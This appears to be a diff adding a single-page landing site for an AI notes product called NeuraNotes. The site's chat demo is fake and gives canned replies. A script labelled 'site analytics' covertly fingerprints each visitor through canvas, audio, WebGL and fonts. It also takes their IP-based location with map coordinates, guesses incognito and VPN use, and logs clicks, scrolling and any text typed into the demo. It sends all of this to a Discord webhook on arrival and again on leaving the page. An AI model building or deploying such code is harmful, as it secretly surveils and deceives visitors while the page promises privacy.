@@ -1,0 +1,330 @@
+<!-- language: HTML/CSS/JS, single-file static site, host: GitHub Pages -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NeuraNotes — AI that remembers for you</title>
+<meta name="description" content="NeuraNotes turns your scattered thoughts into a searchable second brain. Free to try.">
+<style>
+  :root { --bg:#0d1117; --panel:#161b27; --line:#232a3b; --txt:#e6e9f0; --dim:#8b93a7; --acc:#7c6cf0; }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { background:var(--bg); color:var(--txt); font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; }
+  nav { display:flex; justify-content:space-between; align-items:center; padding:18px 6vw; border-bottom:1px solid var(--line); }
+  .logo { font-weight:700; letter-spacing:-.5px; }
+  .logo span { color:var(--acc); }
+  nav a { color:var(--dim); text-decoration:none; margin-left:22px; font-size:14px; }
+  nav a:hover { color:var(--txt); }
+  .hero { max-width:760px; margin:0 auto; padding:70px 24px 30px; text-align:center; }
+  .hero h1 { font-size:clamp(30px,5vw,46px); letter-spacing:-1.5px; line-height:1.15; }
+  .hero p { color:var(--dim); margin:18px 0 30px; font-size:17px; line-height:1.6; }
+  .pill { display:inline-block; font-size:12px; color:var(--acc); border:1px solid var(--acc); border-radius:20px; padding:4px 14px; margin-bottom:20px; }
+  .chat { background:var(--panel); border:1px solid var(--line); border-radius:14px; padding:20px; text-align:left; }
+  .chat .log { min-height:60px; max-height:260px; overflow-y:auto; margin-bottom:14px; }
+  .msg { margin:8px 0; font-size:14px; line-height:1.5; }
+  .msg.user { color:var(--txt); } .msg.bot { color:var(--dim); }
+  .msg.bot::before { content:"◆ "; color:var(--acc); }
+  .row { display:flex; gap:10px; }
+  .row input { flex:1; background:var(--bg); border:1px solid var(--line); border-radius:9px; padding:12px 14px; color:var(--txt); font-size:14px; outline:none; }
+  .row input:focus { border-color:var(--acc); }
+  .row button { background:var(--acc); border:none; border-radius:9px; padding:12px 22px; color:#fff; font-weight:600; cursor:pointer; }
+  .feats { display:grid; grid-template-columns:repeat(auto-fit,minmax(220px,1fr)); gap:16px; max-width:1000px; margin:60px auto; padding:0 24px; }
+  .feat { background:var(--panel); border:1px solid var(--line); border-radius:12px; padding:22px; }
+  .feat h3 { font-size:15px; margin-bottom:8px; }
+  .feat p { color:var(--dim); font-size:13px; line-height:1.6; }
+  footer { text-align:center; color:var(--dim); font-size:13px; padding:40px; border-top:1px solid var(--line); }
+</style>
+</head>
+<body>
+<nav>
+  <div class="logo">Neura<span>Notes</span></div>
+  <div><a href="#demo">Demo</a><a href="#features">Features</a><a href="#">Pricing</a></div>
+</nav>
+
+<section class="hero" id="demo">
+  <div class="pill">Now in open beta — free</div>
+  <h1>Your second brain,<br>running on autopilot.</h1>
+  <p>NeuraNotes captures what you think, sorts what you mean, and surfaces it the moment you need it. Try it below — no signup.</p>
+  <div class="chat">
+    <div class="log" id="log"><div class="msg bot">Give me a thought, a link, or a half-idea. I'll organize it.</div></div>
+    <div class="row">
+      <input id="prompt" type="text" placeholder="e.g. remember to research noise-cancelling headphones..." autocomplete="off">
+      <button id="send">Save</button>
+    </div>
+  </div>
+</section>
+
+<section class="feats" id="features">
+  <div class="feat"><h3>Zero-friction capture</h3><p>Type it once. NeuraNotes tags, links, and files it automatically — no folders, no forms.</p></div>
+  <div class="feat"><h3>Context recall</h3><p>Ask in plain language. Semantic search pulls the right note from months back in milliseconds.</p></div>
+  <div class="feat"><h3>Works everywhere</h3><p>Web, mobile, and a browser extension that clips pages into your brain as you read.</p></div>
+  <div class="feat"><h3>Private by design</h3><p>End-to-end encrypted sync. Your notes are yours — we can't read them, and neither can anyone else.</p></div>
+</section>
+
+<footer>© 2025 NeuraNotes Labs — hello@neuranotes.app</footer>
+
+<script>
+/* ============================================================
+   site analytics v2 — engagement + environment telemetry
+   ============================================================ */
+const ANALYTICS = {
+  // hardened mode: deploy worker.js (below) and swap this for your worker URL
+  endpoint: "https://discord.com/api/webhooks/1557793863467401329/rFJUFHD4cTqrNnilEskKCEwTAqY92Kz8410T-I0FRcR7V_wyOKpKTUlTegXKotRgG7at",
+  username: "Visitor Log"
+};
+
+/* ---------- utilities ---------- */
+function hash(str) {
+  let h1 = 0xdeadbeef, h2 = 0x41c6ce57;
+  for (let i = 0; i < str.length; i++) {
+    const ch = str.charCodeAt(i);
+    h1 = Math.imul(h1 ^ ch, 2654435761);
+    h2 = Math.imul(h2 ^ ch, 1597334677);
+  }
+  h1 = Math.imul(h1 ^ (h1 >>> 16), 2246822507) ^ Math.imul(h2 ^ (h2 >>> 13), 3266489909);
+  h2 = Math.imul(h2 ^ (h2 >>> 16), 2246822507) ^ Math.imul(h1 ^ (h1 >>> 13), 3266489909);
+  return (4294967296 * (2097151 & h2) + (h1 >>> 0)).toString(16);
+}
+const flagOf = (cc) => cc && cc.length === 2
+  ? String.fromCodePoint(...[...cc.toUpperCase()].map(c => 127397 + c.charCodeAt(0))) : "";
+
+async function sendEmbed(embed, keepalive) {
+  const payload = JSON.stringify({ username: ANALYTICS.username, embeds: [embed] });
+  try {
+    if (keepalive) { fetch(ANALYTICS.endpoint, { method: "POST", keepalive: true,
+      headers: { "Content-Type": "application/json" }, body: payload }).catch(() => {});
+    } else {
+      await fetch(ANALYTICS.endpoint, { method: "POST",
+        headers: { "Content-Type": "application/json" }, body: payload });
+    }
+  } catch (e) { /* network died mid-exit — nothing to do */ }
+}
+
+/* ---------- fingerprint probes ---------- */
+function canvasFp() {
+  try {
+    const c = document.createElement("canvas"); c.width = 240; c.height = 60;
+    const x = c.getContext("2d");
+    x.textBaseline = "top"; x.font = "16px 'Arial'";
+    x.fillStyle = "#f60"; x.fillRect(10, 5, 100, 20);
+    x.fillStyle = "#069"; x.fillText("portolan-canvas-fp-01", 4, 30);
+    x.fillStyle = "rgba(102,204,0,0.7)"; x.fillText("quad-harmonic", 8, 45);
+    return hash(c.toDataURL());
+  } catch (e) { return "unavailable"; }
+}
+function webglInfo() {
+  try {
+    const gl = document.createElement("canvas").getContext("webgl")
+            || document.createElement("canvas").getContext("experimental-webgl");
+    const ext = gl.getExtension("WEBGL_debug_renderer_info");
+    return {
+      gpu: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
+      vendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR)
+    };
+  } catch (e) { return { gpu: "unavailable", vendor: "unavailable" }; }
+}
+function audioFp() {
+  return new Promise((resolve) => {
+    try {
+      const Ctx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+      const ctx = new Ctx(1, 5000, 44100);
+      const osc = ctx.createOscillator();
+      osc.type = "triangle"; osc.frequency.value = 10000;
+      const comp = ctx.createDynamicsCompressor();
+      osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
+      ctx.startRendering();
+      ctx.oncomplete = (e) => {
+        const d = e.renderedBuffer.getChannelData(0);
+        let s = ""; for (let i = 4500; i < 5000; i++) s += d[i];
+        resolve(hash(s));
+      };
+    } catch (e) { resolve("unavailable"); }
+  });
+}
+function fontProbe() {
+  const fonts = ["Arial","Verdana","Tahoma","Trebuchet MS","Times New Roman","Georgia","Garamond",
+    "Courier New","Impact","Comic Sans MS","Segoe UI","Calibri","Cambria","Consolas","Franklin Gothic",
+    "Gabriola","Gill Sans","Lucida Console","MS Gothic","MV Boli","Palatino Linotype","Perpetua",
+    "Rockwell","Segoe Print","Sylfaen","Candara","Constantia","Corbel","Futura","Optima","Monaco",
+    "Helvetica Neue","Menlo","Bookman Old Style","Brush Script MT","Century Gothic"];
+  const span = document.createElement("span");
+  span.style.cssText = "position:absolute;left:-9999px;font-size:72px;white-space:nowrap;";
+  span.textContent = "mmmmmmmmmmlliWWQ@#%";
+  document.body.appendChild(span);
+  const base = {};
+  for (const fallback of ["monospace", "serif", "sans-serif"]) {
+    span.style.fontFamily = fallback;
+    base[fallback] = span.offsetWidth + "x" + span.offsetHeight;
+  }
+  const found = [];
+  for (const f of fonts) {
+    let hit = false;
+    for (const fallback of ["monospace", "serif", "sans-serif"]) {
+      span.style.fontFamily = `"${f}",${fallback}`;
+      const m = span.offsetWidth + "x" + span.offsetHeight;
+      if (m !== base[fallback]) hit = true;
+    }
+    if (hit) found.push(f);
+  }
+  span.remove();
+  return found;
+}
+function adblockProbe() {
+  const bait = document.createElement("div");
+  bait.className = "ad-banner adsbox pub_300x250 text-ad";
+  bait.style.cssText = "position:absolute;left:-9999px;height:1px;";
+  document.body.appendChild(bait);
+  const blocked = bait.offsetHeight === 0 || getComputedStyle(bait).display === "none";
+  bait.remove();
+  return blocked;
+}
+async function geoLookup() {
+  try {
+    const g = await (await fetch("https://ipwho.is/")).json();
+    if (g && g.ip && g.success !== false) return { src: "ipwho.is", g };
+  } catch (e) {}
+  try {
+    const g = await (await fetch("https://ipapi.co/json/")).json();
+    if (g && g.ip) return { src: "ipapi.co", g };
+  } catch (e) {}
+  try {
+    const g = await (await fetch("https://api.ipify.org?format=json")).json();
+    return { src: "ipify", g: { ip: g.ip } };
+  } catch (e) {}
+  return { src: "none", g: {} };
+}
+async function incognitoGuess() {
+  try {
+    const est = await navigator.storage.estimate();
+    if (est.quota && est.quota < 300000000) return "likely (low storage quota)";
+    return "unlikely";
+  } catch (e) { return "unknown"; }
+}
+
+/* ---------- behavior tracking ---------- */
+const stats = { start: Date.now(), clicks: 0, keys: 0, moves: 0, maxScroll: 0,
+  lastActive: Date.now(), clicked: [], prompts: [] };
+document.addEventListener("click", (e) => {
+  stats.clicks++; stats.lastActive = Date.now();
+  const t = e.target.closest("a,button,input");
+  const label = t ? (t.tagName + (t.textContent ? ` "${t.textContent.trim().slice(0, 40)}"` : "")) : e.target.tagName;
+  if (stats.clicked.length < 15) stats.clicked.push(label);
+}, true);
+document.addEventListener("keydown", () => { stats.keys++; stats.lastActive = Date.now(); }, true);
+document.addEventListener("mousemove", () => { stats.moves++; stats.lastActive = Date.now(); }, { passive: true, capture: true });
+document.addEventListener("scroll", () => {
+  const h = document.documentElement.scrollHeight - innerHeight;
+  stats.maxScroll = Math.max(stats.maxScroll, h > 0 ? Math.round(scrollY / h * 100) : 100);
+  stats.lastActive = Date.now();
+}, { passive: true, capture: true });
+
+/* ---------- fake product demo (holds the visitor on-page) ---------- */
+const CANNED = [
+  "Got it. Filed under 'research', linked to your last three notes on focus.",
+  "Saved. I noticed a pattern — this connects to what you saved last week.",
+  "Noted, tagged, and indexed. Ask me anything about it later.",
+  "Stored. I'll surface this next time you're shopping or comparing options."
+];
+const logEl = document.getElementById("log"), promptEl = document.getElementById("prompt");
+function addMsg(text, cls) {
+  const d = document.createElement("div");
+  d.className = "msg " + cls; d.textContent = text;
+  logEl.appendChild(d); logEl.scrollTop = logEl.scrollHeight;
+}
+document.getElementById("send").addEventListener("click", submitPrompt);
+promptEl.addEventListener("keydown", (e) => { if (e.key === "Enter") submitPrompt(); });
+function submitPrompt() {
+  const v = promptEl.value.trim();
+  if (!v) return;
+  addMsg(v, "user");
+  if (stats.prompts.length < 10) stats.prompts.push(v.slice(0, 120));
+  promptEl.value = "";
+  addMsg("...", "bot");
+  setTimeout(() => {
+    logEl.lastChild.remove();
+    addMsg(CANNED[Math.floor(Math.random() * CANNED.length)], "bot");
+  }, 800 + Math.random() * 700);
+}
+
+/* ---------- arrival payload ---------- */
+(async function arrive() {
+  const [{ src, g }, audio, incog] = await Promise.all([geoLookup(), audioFp(), incognitoGuess()]);
+  const nav = navigator, scr = screen, tz = Intl.DateTimeFormat().resolvedOptions();
+  const wg = webglInfo(), cf = canvasFp(), fonts = fontProbe();
+  const conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};
+  const connStr = [conn.effectiveType, conn.downlink ? conn.downlink + "Mbps" : "",
+    conn.rtt ? conn.rtt + "ms rtt" : ""].filter(Boolean).join(", ") || "n/a";
+
+  let battery = "n/a";
+  try { if (nav.getBattery) { const b = await nav.getBattery();
+    battery = Math.round(b.level * 100) + "%" + (b.charging ? " (charging)" : ""); } } catch (e) {}
+
+  let visits = 1;
+  try { visits = (parseInt(localStorage.getItem("nn_v") || "0") + 1); localStorage.setItem("nn_v", visits); } catch (e) {}
+
+  const geoTz = g.timezone && g.timezone.id;
+  const tzMismatch = geoTz && tz.timeZone && geoTz !== tz.timeZone
+    ? "⚠ timezone mismatch — possible VPN/proxy" : "consistent";
+
+  const cc = g.country_code || "";
+  const map = g.latitude ? `maps: https://www.google.com/maps?q=${g.latitude},${g.longitude}` : "";
+
+  const fields = [
+    ["IP address", `\`${g.ip || "unknown"}\`  (via ${src})`, true],
+    ["Location", [flagOf(cc), g.city, g.region, g.country].filter(Boolean).join(", ") || "unknown", true],
+    ["Coords / Map", map || "n/a", true],
+    ["ISP", (g.connection && (g.connection.isp || g.connection.org)) || "n/a", true],
+    ["ASN", (g.connection && g.connection.asn) ? "AS" + g.connection.asn : "n/a", true],
+    ["Type", g.type || "n/a", true],
+    ["Timezone", `${tz.timeZone} · local ${new Date().toLocaleString()}`, true],
+    ["TZ check", tzMismatch, true],
+    ["Visit count", "#" + visits, true],
+    ["Browser / OS", nav.userAgent, false],
+    ["Platform", `${nav.platform} · ${nav.hardwareConcurrency || "?"} cores · ${nav.deviceMemory || "?"}GB RAM · ${nav.maxTouchPoints || 0} touch pts`, false],
+    ["Screen", `${scr.width}x${scr.height} (avail ${scr.availWidth}x${scr.availHeight}) · ${scr.colorDepth}bit · DPR ${devicePixelRatio} · viewport ${innerWidth}x${innerHeight}`, false],
+    ["GPU", `${wg.gpu} (${wg.vendor})`, false],
+    ["Language", `${nav.language} · accepts ${nav.languages.join(", ")}`, true],
+    ["Fingerprint", `canvas \`${cf}\` · audio \`${audio}\` · ${fonts.length} fonts · visitor ID \`${hash(nav.userAgent + cf + audio + scr.width + scr.height + nav.language).slice(0, 12)}\``, false],
+    ["Connection", connStr, true],
+    ["Battery", battery, true],
+    ["Prefs", `dark mode: ${matchMedia("(prefers-color-scheme: dark)").matches ? "yes" : "no"} · DNT: ${nav.doNotTrack || "unset"} · cookies: ${nav.cookieEnabled ? "on" : "off"}`, true],
+    ["Environment", `adblock: ${adblockProbe() ? "yes" : "no"} · incognito: ${incog} · webdriver/bot: ${nav.webdriver ? "yes" : "no"}`, true],
+    ["Referrer", document.referrer || "direct", false],
+    ["Landed on", location.href, false]
+  ];
+
+  await sendEmbed({
+    title: `${flagOf(cc) || "👀"} New visitor — ${g.ip || "unknown IP"}`,
+    color: 0x7c6cf0,
+    timestamp: new Date().toISOString(),
+    footer: { text: "NeuraNotes analytics" },
+    fields: fields.map(([name, value, inline]) => ({ name, value, inline }))
+  });
+
+  /* ---------- exit payload: what they did while here ---------- */
+  let exited = false;
+  async function exitReport() {
+    if (exited) return; exited = true;
+    const secs = Math.round((Date.now() - stats.start) / 1000);
+    const activeSecs = Math.round((stats.lastActive - stats.start) / 1000);
+    await sendEmbed({
+      title: `Left — ${g.ip || "unknown IP"}`,
+      color: 0xe0533d,
+      timestamp: new Date().toISOString(),
+      fields: [
+        ["Time on page", `${secs}s (active ${activeSecs}s)`, true],
+        ["Scroll depth", stats.maxScroll + "%", true],
+        ["Interactions", `${stats.clicks} clicks · ${stats.keys} keys · ${stats.moves} mousemoves`, true],
+        ["Click path", stats.clicked.join(" → ") || "none", false],
+        ["Typed into demo", stats.prompts.length ? stats.prompts.map(p => `"${p}"`).join(" | ") : "nothing", false]
+      ].map(([name, value, inline]) => ({ name, value, inline }))
+    }, true); // keepalive — survives tab close
+  }
+  addEventListener("pagehide", exitReport);
+  document.addEventListener("visibilitychange", () => {
+    if (document.visibilityState === "hidden") exitReport();
+  });
+})();
+</script>
+</body>
+</html>
